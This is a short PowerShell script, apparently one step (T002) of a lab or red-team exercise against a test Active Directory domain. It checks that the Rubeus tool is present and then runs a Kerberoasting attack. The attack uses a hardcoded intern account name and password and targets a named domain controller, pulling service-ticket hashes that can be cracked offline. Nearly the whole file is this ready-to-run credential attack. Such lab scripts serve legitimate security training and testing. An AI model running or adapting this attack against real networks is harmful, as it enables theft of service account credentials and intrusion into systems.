[CmdletBinding()]
param()
$ErrorActionPreference = "Continue"
$exe = "C:\Tools\cadre-attack\Rubeus.exe"
if (-not (Test-Path -LiteralPath $exe)) {
    Write-Output "T002_FAIL: Rubeus.exe missing"
    exit 1
}
& $exe kerberoast /creduser:child.cadre.local\intern_blue /credpassword:1nt3rn_Blu3! /creddomain:child.cadre.local /domain:child.cadre.local /dc:dc02.child.cadre.local /nowrap
